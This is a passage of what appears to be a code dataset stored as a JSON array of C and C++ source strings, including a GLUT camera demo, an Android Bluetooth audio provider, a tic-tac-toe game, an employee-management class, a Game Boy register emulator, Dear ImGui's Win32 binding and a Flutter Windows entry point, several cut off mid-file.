glutInitWindowSize(WIDTH, HEIGHT);\n    glutInitWindowPosition(100, 100);\n    glutCreateWindow(\"Camera\");\n    glClearColor(1.0, 1.0, 1.0, 1.0);\n    glMatrixMode(GL_PROJECTION);\n}\n\nint main(int argc, char *argv[])\n{\n    init(&argc, argv);\n    glutMouseWheelFunc(mouse_wheel_CB);\n    glutReshapeFunc(resize);\n    glutDisplayFunc(draw);\n    glutMainLoop();\n\n    return 0;\n}\n",
    "/*\n * Copyright (C) 2022 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"BTAudioProviderStub\"\n\n#include \"BluetoothAudioProvider.h\"\n\n#include <BluetoothAudioSessionReport.h>\n#include <android-base/logging.h>\n\nnamespace aidl {\nnamespace android {\nnamespace hardware {\nnamespace bluetooth {\nnamespace audio {\n\nBluetoothAudioProvider::BluetoothAudioProvider() {\n  death_recipient_ = ::ndk::ScopedAIBinder_DeathRecipient(\n      AIBinder_DeathRecipient_new(binderDiedCallbackAidl));\n}\n\nndk::ScopedAStatus BluetoothAudioProvider::startSession(\n    const std::shared_ptr<IBluetoothAudioPort>& host_if,\n    const AudioConfiguration& audio_config,\n    const std::vector<LatencyMode>& latencyModes,\n    DataMQDesc* _aidl_return) {\n  if (host_if == nullptr) {\n    *_aidl_return = DataMQDesc();\n    return ndk::ScopedAStatus::fromExceptionCode(EX_ILLEGAL_ARGUMENT);\n  }\n\n  latency_modes_ = latencyModes;\n  audio_config_ = std::make_unique<AudioConfiguration>(audio_config);\n  stack_iface_ = host_if;\n  is_binder_died = false;\n\n  AIBinder_linkToDeath(stack_iface_->asBinder().get(), death_recipient_.get(),\n                       this);\n\n  onSessionReady(_aidl_return);\n  return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus BluetoothAudioProvider::endSession() {\n  LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_);\n\n  if (stack_iface_ != nullptr) {\n    BluetoothAudioSessionReport::OnSessionEnded(session_type_);\n\n    if (!is_binder_died) {\n      AIBinder_unlinkToDeath(stack_iface_->asBinder().get(),\n                             death_recipient_.get(), this);\n    }\n  } else {\n    LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_)\n              << \" has NO session\";\n  }\n\n  stack_iface_ = nullptr;\n  audio_config_ = nullptr;\n\n  return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus BluetoothAudioProvider::streamStarted(\n    BluetoothAudioStatus status) {\n  LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_)\n            << \", status=\" << toString(status);\n\n  if (stack_iface_ != nullptr) {\n    BluetoothAudioSessionReport::ReportControlStatus(session_type_, true,\n                                                     status);\n  } else {\n    LOG(WARNING) << __func__ << \" - SessionType=\" << toString(session_type_)\n                 << \", status=\" << toString(status) << \" has NO session\";\n  }\n\n  return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus BluetoothAudioProvider::streamSuspended(\n    BluetoothAudioStatus status) {\n  LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_)\n            << \", status=\" << toString(status);\n\n  if (stack_iface_ != nullptr) {\n    BluetoothAudioSessionReport::ReportControlStatus(session_type_, false,\n                                                     status);\n  } else {\n    LOG(WARNING) << __func__ << \" - SessionType=\" << toString(session_type_)\n                 << \", status=\" << toString(status) << \" has NO session\";\n  }\n  return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus BluetoothAudioProvider::updateAudioConfiguration(\n    const AudioConfiguration& audio_config) {\n  LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_);\n\n  if (stack_iface_ == nullptr || audio_config_ == nullptr) {\n    LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_)\n              << \" has NO session\";\n    return ndk::ScopedAStatus::fromExceptionCode(EX_ILLEGAL_ARGUMENT);\n  }\n\n  if (audio_config.getTag() != audio_config_->getTag()) {\n    LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_)\n              << \" audio config type is not match\";\n    return ndk::ScopedAStatus::fromExceptionCode(EX_ILLEGAL_ARGUMENT);\n  }\n\n  audio_config_ = std::make_unique<AudioConfiguration>(audio_config);\n  BluetoothAudioSessionReport::ReportAudioConfigChanged(session_type_,\n                                                        *audio_config_);\n  return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus BluetoothAudioProvider::setLowLatencyModeAllowed(\n    bool allowed) {\n  LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_);\n\n  if (stack_iface_ == nullptr) {\n    LOG(INFO) << __func__ << \" - SessionType=\" << toString(session_type_)\n              << \" has NO session\";\n    return ndk::ScopedAStatus::fromExceptionCode(EX_ILLEGAL_ARGUMENT);\n  }\n  LOG(INFO) << __func__ << \" - allowed \" << allowed;\n  BluetoothAudioSessionReport::ReportLowLatencyModeAllowedChanged(\n    session_",
    "#include \"logger.h\"\n#include <cassert>\n\nusing namespace logger;\n\nint main()\n{\n\n{\n    std::cout << \"\\tSingleton check: only one instance of logger is allowed\" << std::endl;\n    std::cout << \"\\t___________________\" << std::endl;\n    std::cout << \"\\t Trace level enabled, color output of all events must be shown\" << std::endl;\n    std::cout << \"\\t___________________\" << std::endl;\n    Logger *log_tr = Logger::Init(LogLevel::TRACE_LEVEL, LOG_TO_CONSOLE);\n    log_tr->Trace(\"trace event\");\n    log_tr->Debug(\"debug event\");\n    log_tr->Info(\"info event\");\n    log_tr->Error(\"error event\");\n    log_tr->Fatal(\"fatal event\");\n    std::cout << \"\\t___________________\" << std::endl;\n    std::cout << \"\\t Attempt to create another instance with Fatal level,\"<<std::endl;\n    std::cout<< \"\\t Must be no changes in output\" << std::endl;\n    std::cout << \"\\t___________________\" << std::endl;\n    Logger *log_ft = Logger::Init(LogLevel::FATAL_LEVEL, LOG_TO_CONSOLE);\n    log_ft->Trace(\"trace event\");\n    log_ft->Debug(\"debug event\");\n    log_ft->Info(\"info event\");\n    log_ft->Error(\"error event\");\n    log_ft->Fatal(\"fatal event\");\n    assert(log_tr==log_ft);\n}\n\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nchar converter(int numero)\n{\n    char letra;\n    switch(numero)\n    {\n    case 1:\n        letra = 'O';\n        break;\n    case 3:\n        letra = 'X';\n        break;\n    default:\n        letra = ' ';\n        break;\n    }\n    return letra;\n}\n\nvoid mostrarTabuleiro(int matriz[3][3])\n{\n    for (int i = 0; i < 3; i++)\n    {\n        if (i > 0) printf(\"-----\\n\");\n        printf(\"%c|%c|%c\\n\", converter(matriz[i][0]), converter(matriz[i][1]), converter(matriz[i][2]));\n    }\n}\n\nvoid usuarioJoga(int matriz[3][3])\n{\n    int linha, coluna;\n    do\n    {\n        printf(\"Escolha linha e coluna (0-2): \");\n        scanf(\"%d %d\", &linha, &coluna);\n        if (linha < 0 || linha > 2 || coluna < 0 || coluna > 2)\n        {\n            printf(\"Posi\u00e7\u00e3o inv\u00e1lida! Escolha uma linha e coluna entre 0 e 2.\\n\");\n        }\n        else if (matriz[linha][coluna] != 2)\n        {\n            printf(\"Posi\u00e7\u00e3o j\u00e1 ocupada! Escolha outra posi\u00e7\u00e3o.\\n\");\n        }\n    }\n    while (linha < 0 || linha > 2 || coluna < 0 || coluna > 2 || matriz[linha][coluna] != 2);\n    matriz[linha][coluna] = 1; // O jogador sempre joga com 'O'\n}\n\nint verificaSeXGanhou(int matriz[3][3])\n{\n    int produtos[8] = {1, 1, 1, 1, 1, 1, 1, 1}; // 3 linhas, 3 colunas, 2 diagonais\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            produtos[i] *= matriz[i][j]; // Linhas\n            produtos[3 + j] *= matriz[i][j]; // Colunas\n            if (i == j) produtos[6] *= matriz[i][j]; // Diagonal principal\n            if (i + j == 2) produtos[7] *= matriz[i][j]; // Diagonal secund\u00e1ria\n        }\n    }\n    for (int i = 0; i < 8; i++)\n    {\n        if (produtos[i] == 27) return 1; // 3 * 3 * 3 = 27, X ganhou\n    }\n    return 0;\n}\n\nint verificaSeOGanhou(int matriz[3][3])\n{\n    int produtos[8] = {1, 1, 1, 1, 1, 1, 1, 1};\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            produtos[i] *= matriz[i][j];\n            produtos[3 + j] *= matriz[i][j];\n            if (i == j) produtos[6] *= matriz[i][j];\n            if (i + j == 2) produtos[7] *= matriz[i][j];\n        }\n    }\n    for (int i = 0; i < 8; i++)\n    {\n        if (produtos[i] == 1) return 1; // 1 * 1 * 1 = 1, O ganhou\n    }\n    return 0;\n}\nvoid computadorJoga(int matriz[3][3])\n{\n    int linha, coluna;\n    // Verifica se o computador pode ganhar em alguma linha\n    for (linha = 0; linha < 3; linha++)\n    {\n        int soma = 1; // Come\u00e7a com 1 para multiplica\u00e7\u00e3o\n        for (coluna = 0; coluna < 3; coluna++)\n        {\n            soma *= matriz[linha][coluna];\n        }\n        if (soma == 18)   // 2 * 3 * 3 = 18, a linha tem duas casas do computador e uma vazia\n        {\n            for (coluna = 0; coluna < 3; coluna++)\n            {\n                if (matriz[linha][coluna] == 2)\n                {\n                    matriz[linha][coluna] = 3; // Faz a jogada para ganhar\n                    return;\n                }\n            }\n        }\n    }\n    // Verifica se o computador pode ganhar em alguma coluna\n    for (coluna = 0; coluna < 3; coluna++)\n    {\n        int soma = 1;\n        for (linha = 0; linha < 3; linha++)\n        {\n            soma *= matriz[linha][coluna];\n        }\n        if (soma == 18)\n        {\n            for (linha = 0; linha < 3; linha++)\n            {\n                if (matriz[linha][coluna] == 2)\n                {\n                    matriz[linha][coluna] = 3;\n                    return;\n                }\n            }\n        }\n    }\n    // Verifica se o computador pode ganhar na diagonal principal\n    int somaDiagonalPrincipal = 1;\n    for (linha = 0; linha < 3; linha++)\n    {\n        somaDiagonalPrincipal *= matriz[linha][linha];\n    }\n    if (somaDiagonalPrincipal == 18)\n    {\n        for (linha = 0; linha < 3; linha++)\n        {\n            if (matriz[linha][linha] == 2)\n            {\n                matriz[linha][linha] = 3;\n                return;\n            }\n        }\n    }\n    // Verifica se o computador pode ganhar na diagonal secund\u00e1ria\n    int somaDiagonalSecundaria = 1;\n    for (linha = 0; linha < 3; linha++)\n    {\n        somaDiagonalSecundaria *= matriz[linha][2 - linha];\n    }\n    if (somaDiagonalSecundaria == 18)\n    {\n        for (linha = 0; linha < 3; linha++)\n        {\n            if (matriz[linha][2 - linha] == 2)\n            {\n                matriz[linha][2 - linha] = 3;\n                return;\n            }\n        }\n    }\n    // Se n\u00e3o puder ganhar, verifica se pode bloquear o jogador 'O'\n    // Verifica se o jogador 'O' pode ganhar em alguma linha\n    for (linha = 0; linha < 3; linha++)\n    {\n        int soma = 1;\n        for (coluna = 0; coluna < 3; coluna++)\n        {\n            soma *= matriz[linha][coluna];\n        }\n        if (soma == 2)   // 1 * 2 * 1 = 2, a linha tem duas casas do jogador 'O' e uma vazia\n        {\n            for (coluna = 0; coluna < 3; coluna++)\n            {\n                if (matriz[linha][coluna] == 2)\n                {\n     ",
    "#include \"../../include/Angajati/Angajat.h\"\n\n#include \"../../include/enum.h\"\n#include \"../../include/utile/functions.h\"\n#include \"../../include/utile/utileAngajati.h\"\n#include \"../../include/enum.h\"\n\n#include \"../../include/Angajati/Director.h\"\n#include \"../../include/Angajati/Mecanic.h\"\n#include \"../../include/Angajati/Asistent.h\"\n#include \"../../include/utile/utileMasini.h\"\n\nunsigned int Angajat::ID = 0;\n\n// MARK: - Constructori\nAngajat::Angajat() {\n    idAngajat = ID++;\n    nume = \"\";\n    prenume = \"\";\n    coeficientSalariu = 0;\n    for (int i = 0; i < 3; i++) {\n        dataNastere[i] = \"\";\n        dataAngajare[i] = \"\";\n    }\n    for (int i = 0; i < 5; i++) {\n        unixOcupat[i] = 0;\n    }\n    masiniInAsteptare = nullptr;\n    nrMasiniInAsteptare = 0;\n}\n\nAngajat::Angajat(const string &nume, const string &prenume, const string *dataNastere, const string *dataAngajare, const long long *unixOcupat, const unsigned int &nrAsteptare, masinaInAsteptare *masiniAsteptare) {\n    idAngajat = ID++;\n    this->nume = nume;\n    this->prenume = prenume;\n    for (int i = 0; i < 3; i++) {\n        this->dataNastere[i] = dataNastere[i];\n        this->dataAngajare[i] = dataAngajare[i];\n    }\n    for (int i = 0; i < 5; i++) {\n        this->unixOcupat[i] = unixOcupat[i];\n    }\n    coeficientSalariu = 0;\n\n    nrMasiniInAsteptare = nrAsteptare;\n    masiniInAsteptare = new masinaInAsteptare[nrMasiniInAsteptare];\n    for (unsigned int i = 0; i < nrMasiniInAsteptare; i++) {\n        masiniInAsteptare[i] = masiniAsteptare[i];\n    }\n}\n\nAngajat::Angajat(const Angajat &a) {\n    masiniInAsteptare = nullptr;\n    *this = a;\n}\n\nAngajat& Angajat::operator=(const Angajat &a) {\n    if(this != &a) {\n        idAngajat = a.idAngajat;\n        nume = a.nume;\n        prenume = a.prenume;\n        for (int i = 0; i < 3; i++) {\n            dataNastere[i] = a.dataNastere[i];\n            dataAngajare[i] = a.dataAngajare[i];\n        }\n        for (int i = 0; i < 5; i++) {\n            unixOcupat[i] = a.unixOcupat[i];\n        }\n        coeficientSalariu = a.coeficientSalariu;\n        nrMasiniInAsteptare = a.nrMasiniInAsteptare;\n        \n        delete [] masiniInAsteptare;\n        masiniInAsteptare = new masinaInAsteptare[nrMasiniInAsteptare];\n        for (unsigned int i = 0; i < nrMasiniInAsteptare; i++) {\n            masiniInAsteptare[i] = a.masiniInAsteptare[i];\n        }\n    }\n    return *this;\n\n}\n\n// MARK: - Destructor\nAngajat::~Angajat() {\n    ID--;\n\n    delete[] masiniInAsteptare;\n    masiniInAsteptare = nullptr;\n    nrMasiniInAsteptare = 0;\n}\n\nunsigned int Angajat::getID() {\n    return ID;\n}\n\nvoid Angajat::setAllID(const unsigned int &id) {\n    ID = id;\n}\n\nunsigned int Angajat::getIdAngajat() const {\n    return idAngajat;\n}\n\n// MARK: - Afisare\nvoid Angajat::afisareAngajat() const {\n    sendAngajatID(this);\n    cout << \"Nume: \" << nume << \" | \";\n    cout << \"Prenume: \" << prenume << endl;\n    cout << \"Data Nastere: \" << dataNastere[0] << \"/\" << dataNastere[1] << \"/\" << dataNastere[2] << endl;\n    cout << \"Data Angajare: \" << dataAngajare[0] << \"/\" << dataAngajare[1] << \"/\" << dataAngajare[2] << endl;\n    cout << \"Locuri in atelier: \" << endl;\n    cout << \"\\tMasini: \";\n    for (int i = 0; i < 3; i++) {\n        cout << ((unixOcupat[i] != 0) ? to_string(unixOcupat[i]) : \"liber\") << ((i == 2) ? \" \" : \" | \");\n    }\n    cout << endl;\n    cout << \"\\tAutobuz: \" << ((unixOcupat[3] != 0) ? to_string(unixOcupat[3]) : \"liber\") << endl;\n    cout << \"\\tCamion: \" << ((unixOcupat[4] != 0) ? to_string(unixOcupat[4]) : \"liber\") << endl;\n}\n\n// MARK: - Getters\nstring Angajat::getNume() {\n    return nume;\n}\n\nstring Angajat::getPrenume() {\n    return prenume;\n}\n\nstring *Angajat::getDataAngajare() {\n    return dataAngajare;\n}\n\nstring *Angajat::getDataNastere() {\n    return dataNastere;\n}\n\nvoid Angajat::editAngajat()\n{\n    unsigned int modify = 0;\n\n    do\n    {\n        sendInfo(\"Urmeaza sa il modifici pe user-ul: \");\n        afisareAngajat();\n\n        sendInfo(\"Ce doresti sa modifici?\");\n        sendInfo(\"Parametrii pentru modificare: nume, prenume, data_nastere, data_angajare: \");\n        string type;\n        cin >> type;\n        atributeAngajati typeParam = angajatiGetParametru(type);\n\n        switch (typeParam)\n        {\n            case NUME:\n            {\n                sendSeparator();\n                citesteValoare(\"Numele nou\");\n                string newNume;\n                do\n                {\n                    cin >> newNume;\n                    if (newNume.empty())\n                    {\n                        sendError(\"Numele introdus nu este valid, introdu un nou nume: \");\n                        citesteValoare(\"Introdu numele\");\n                    }\n                } while (newNume.empty());\n                nume = newNume;\n                sendSuccess(\"Numele a fost setat cu succes!\");\n                break;\n            }\n\n            case PRENUME:\n            {\n                sendSeparator();\n                citesteValoare(\"Prenumele nou\");\n          ",
    "//Name: Leo Jamu\n//alculating area of shapes based on user choices\n\n#include<iostream>\nusing namespace std;\n\ndouble triangle(int b, int c);\n\nint rectangle(int l, int w);\n\nint square(int length);\n\nint main() {\nbool inputValid = false;\n\n    do {\n        cout << \"\\nPlease select the area of the shape to calculate:\" << endl;\n        cout << \"1. Square\" << endl;\n        cout << \"2. Rectangle\" << endl;\n        cout << \"3. Triangle\" << endl;\n        cout << \"4. Quit program\" << endl;\n\n        int choice;\n        cin >> choice;\n        int length, width, base, height;\n\n        switch (choice) {\n            case 1:\n                cout << \"Enter the length: \";\n                cin >> length;\n                cout << \"The area of the Square is: \" << square(length);\n                inputValid = true;\n                break;\n\n            case 2:\n                cout << \"Enter the length: \";\n                cin >> length;\n                cout << \"Enter the width: \";\n                cin >> height;\n                cout << \"The area of the Rectangle is: \" << rectangle(length, height);\n                inputValid = true; //terminates after calculation\n                break;\n\n            case 3:\n                cout << \"Enter the base length: \";\n                cin >> length;\n                cout << \"Enter the height: \";\n                cin >> height;\n                cout << \"The area of the Triangle is: \" << triangle(length, height);\n                inputValid = true; //terminates after calculation\n                break;\n\n            case 4:\n                exit(0); //quit for the program\n                break;\n\n            default:\n                cout << \"Your input was: \"<<choice<<\" which is invalid input\"<<\"\\nPlease enter a valid input\";\n                inputValid = false; //re runs the program  \n                break;\n        }\n\n    } while (!inputValid);\n\n    return 0;\n}\n\nint square(int length) {\n    return length * length;\n}\n\nint rectangle(int length, int width) {\n    return length * width;\n}\n\ndouble triangle(int base, int height) {\n    return (base * height) / 2.0;\n}\n",
    "#include \"registers.h\"\n#include <stdexcept>\n\nRegisters::Registers()\n{\n    reset();\n}\n\nvoid Registers::reset()\n{\n    af = 0x01B0;\n    bc = 0x0013;\n    de = 0x00D8;\n    hl = 0x014D;\n    sp = 0xFFFE;\n    pc = 0x0100;\n\n    flags.zero = false;\n    flags.addSubtract = false;\n    flags.half_carry = false;\n    flags.carry = false;\n}\n\nvoid Registers::setFirstByte(uint8_t byte, enum RegisterTypes reg)\n{\n    switch (reg)\n    {\n        case RegisterTypes::A:\n            a = byte;\n            break;\n        case RegisterTypes::C:\n            c = byte;\n            break;\n        case RegisterTypes::E:\n            e = byte;\n            break;\n        case RegisterTypes::L:\n            l = byte;\n            break;\n        default:\n            std::invalid_argument(\"Invalid register type\");\n            break;\n    }\n}\n\nvoid Registers::setSecondByte(uint8_t byte, enum RegisterTypes reg)\n{\n    switch (reg)\n    {\n        case RegisterTypes::F:\n            f = byte;\n            break;\n        case RegisterTypes::B:\n            b = byte;\n            break;\n        case RegisterTypes::D:\n            d = byte;\n            break;\n        case RegisterTypes::H:\n            h = byte;\n            break;\n        default:\n            std::invalid_argument(\"Invalid register type\");\n            break;\n    \n    }\n}\n\nvoid Registers::setTwoBytes(uint16_t word, enum RegisterTypes reg)\n{\n    switch (reg)\n    {\n        case RegisterTypes::AF:\n            af = word;\n            break;\n        case RegisterTypes::BC:\n            bc = word;\n            break;\n        case RegisterTypes::DE:\n            de = word;\n            break;\n        case RegisterTypes::HL:\n            hl = word;\n            break;\n        case RegisterTypes::SP:\n            sp = word;\n            break;\n        case RegisterTypes::PC:\n            pc = word;\n            break;\n        default:\n            std::invalid_argument(\"Invalid register type\");\n            break;\n    }\n}\n\n\nvoid Registers::numToFlags(uint8_t byte)\n{\n    uint8_t zero = (( byte >> 7 ) & 0b1) == 1;\n    uint8_t subtract = (( byte >> 6 ) & 0b1) == 1;\n    uint8_t half_carry = (( byte >> 5 ) & 0b1) == 1;\n    uint8_t carry = (( byte >> 4 ) & 0b1) == 1;\n\n    flags.zero = zero;\n    flags.addSubtract = subtract;\n    flags.half_carry = half_carry;\n    flags.carry = carry;\n\n}\n\nuint8_t Registers::flagsToNum() {\n    uint8_t zero = flags.zero;\n    uint8_t subtract = flags.addSubtract;\n    uint8_t half_carry = flags.half_carry;\n    uint8_t carry = flags.carry;\n\n    return (zero << 7) | (subtract << 6) | (half_carry << 5) | (carry << 4);\n}\n\n\nvoid Registers::flags::raiseFlag(enum FlagTypes flag)\n{\n    switch (flag)\n    {\n        case FlagTypes::ZERO:\n            zero = true;\n            *f = *f | 0b10000000;\n            break;\n        case FlagTypes::CARRY:\n            carry = true;\n            *f = *f | 0b00010000;\n            break;\n        case FlagTypes::HALF_CARRY:\n            half_carry = true;\n            *f = *f | 0b00100000;\n            break;\n        case FlagTypes::ADDSUB:\n            addSubtract = true;\n            *f = *f | 0b01000000;\n            break;\n        default:\n            std::invalid_argument(\"Invalid flag type\");\n            break;\n    }\n    // lower the lower 4 bits of the flag register\n    *f = *f & 0b11110000;\n}\n\nvoid Registers::flags::lowerFlag(enum FlagTypes flag)\n{\n    switch (flag)\n    {\n        case FlagTypes::ZERO:\n            zero = false;\n            *f = *f & 0b01111111;\n            break;\n        case FlagTypes::CARRY:\n            carry = false;\n            *f = *f & 0b11101111;\n            break;\n        case FlagTypes::HALF_CARRY:\n            half_carry = false;\n            *f = *f & 0b11011111;\n            break;\n        case FlagTypes::ADDSUB:\n            addSubtract = false;\n            *f = *f & 0b10111111;\n            break;\n        default:\n            std::invalid_argument(\"Invalid flag type\");\n            break;\n    }\n    // lower the lower 4 bits of the flag register\n    *f = *f & 0b11110000;\n}\n\nbool Registers::flags::getFlag(enum FlagTypes flag)\n{\n   // checks f bitwise\n    switch (flag)\n    {\n        case FlagTypes::ZERO:\n            return *f & 0b10000000;\n        case FlagTypes::CARRY:\n            return *f & 0b00010000;\n        case FlagTypes::HALF_CARRY:\n            return *f & 0b00100000;\n        case FlagTypes::ADDSUB:\n            return *f & 0b01000000;\n        default:\n            std::invalid_argument(\"Invalid flag type\");\n            return false;\n    }\n}\n\nvoid Registers::flags::reset()\n{\n    *f = 0x00;\n    zero = false;\n    carry = false;\n    half_carry = false;\n    addSubtract = false;\n}",
    "// dear imgui: Platform Binding for Windows (standard windows API for 32 and 64 bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core imgui)\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n//  [X] Platform: Keyboard arrays indexed using VK_* Virtual Key Codes, e.g. ImGui::IsKeyPressed(VK_SPACE).\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n\n#include \"imgui.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <XInput.h>\n#include <tchar.h>\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2019-12-05: Inputs: Added support for ImGuiMouseCursor_NotAllowed mouse cursor.\n//  2019-05-11: Inputs: Don't filter value from WM_CHAR before calling AddInputCharacter().\n//  2019-01-17: Misc: Using GetForegroundWindow()+IsChild() instead of GetActiveWindow() to be compatible with windows created in a different thread or parent.\n//  2019-01-17: Inputs: Added support for mouse buttons 4 and 5 via WM_XBUTTON* messages.\n//  2019-01-15: Inputs: Added support for XInput gamepads (if ImGuiConfigFlags_NavEnableGamepad is set by user application).\n//  2018-11-30: Misc: Setting up io.BackendPlatformName so it can be displayed in the About Window.\n//  2018-06-29: Inputs: Added support for the ImGuiMouseCursor_Hand cursor.\n//  2018-06-10: Inputs: Fixed handling of mouse wheel messages to support fine position messages (typically sent by track-pads).\n//  2018-06-08: Misc: Extracted imgui_impl_win32.cpp/.h away from the old combined DX9/DX10/DX11/DX12 examples.\n//  2018-03-20: Misc: Setup io.BackendFlags ImGuiBackendFlags_HasMouseCursors and ImGuiBackendFlags_HasSetMousePos flags + honor ImGuiConfigFlags_NoMouseCursorChange flag.\n//  2018-02-20: Inputs: Added support for mouse cursors (ImGui::GetMouseCursor() value and WM_SETCURSOR message handling).\n//  2018-02-06: Inputs: Added mapping for ImGuiKey_Space.\n//  2018-02-06: Inputs: Honoring the io.WantSetMousePos by repositioning the mouse (when using navigation and ImGuiConfigFlags_NavMoveMouse is set).\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2018-01-20: Inputs: Added Horizontal Mouse Wheel support.\n//  2018-01-08: Inputs: Added mapping for ImGuiKey_Insert.\n//  2018-01-05: Inputs: Added WM_LBUTTONDBLCLK double-click handlers for window classes with the CS_DBLCLKS flag.\n//  2017-10-23: Inputs: Added WM_SYSKEYDOWN / WM_SYSKEYUP handlers so e.g. the VK_MENU key can be read.\n//  2017-10-23: Inputs: Using Win32 ::SetCapture/::GetCapture() to retrieve mouse positions outside the client area when dragging.\n//  2016-11-12: Inputs: Only call Win32 ::SetCursor(NULL) when io.MouseDrawCursor is set.\n\n// Win32 Data\nstatic HWND                 g_hWnd = 0;\nstatic INT64                g_Time = 0;\nstatic INT64                g_TicksPerSecond = 0;\nstatic ImGuiMouseCursor     g_LastMouseCursor = ImGuiMouseCursor_COUNT;\nstatic bool                 g_HasGamepad = false;\nstatic bool                 g_WantUpdateHasGamepad = true;\n\n// Functions\nbool    ImGui_ImplWin32_Init(void* hwnd)\n{\n    if (!::QueryPerformanceFrequency((LARGE_INTEGER *)&g_TicksPerSecond))\n        return false;\n    if (!::QueryPerformanceCounter((LARGE_INTEGER *)&g_Time))\n        return false;\n\n    // Setup back-end capabilities flags\n    g_hWnd = (HWND)hwnd;\n    ImGuiIO& io = ImGui::GetIO();\n    io.BackendFlags |= ImGuiBackendFlags_HasMouseCursors;         // We can honor GetMouseCursor() values (optional)\n    io.BackendFlags |= ImGuiBackendFlags_HasSetMousePos;          // We can honor io.WantSetMousePos requests (optional, rarely used)\n    io.BackendPlatformName = \"imgui_impl_win32\";\n    io.ImeWindowHandle = hwnd;\n\n    // Keyboard mapping. ImGui will use those indices to peek into the io.KeysDown[] array that we will update during the application lifetime.\n    io.KeyMap[ImGuiKey_Tab] = VK_TAB;\n    io.KeyMap[ImGuiKey_LeftArrow] = VK_LEFT;\n    io.KeyMap[ImGuiKey_RightArrow] = VK_RIGHT;\n    io.KeyMap[ImGuiKey_UpArrow] = VK_UP;\n    io.KeyMap[ImGuiKey_DownArrow] = VK_DOWN;\n    io.KeyMap[ImGuiKey_PageUp] = VK_PRIOR;\n    io.KeyMap[ImGuiKey_PageDown] = VK_NEXT;\n    io.KeyMap[ImGuiKey_Home] = VK_HOME;\n    io.KeyMap[ImGuiKey_End] = VK_END;\n    io.KeyMap[ImGuiKey_Insert] = VK_INSERT;\n    io.KeyMap[ImGuiKey_Delete] = VK_DELETE;\n    io.KeyMap[ImGuiKey_Backspace] = VK_BACK;\n    io.KeyMap[ImGuiKey_Space] = VK_SPACE;\n    io.KeyMap[ImGuiKey_Enter] = VK_RETURN;\n    io.KeyMap[ImGuiKey_Escape] = VK_ESCAPE;\n    io.KeyMap[ImGuiKey_KeyPadEnter] = VK_RETURN;\n    io.KeyMap[ImGuiKey_A] = 'A';\n    io.KeyMap[ImGuiKey_C] = 'C';\n    io.KeyMap[ImGuiKey_V]",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dars_23\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
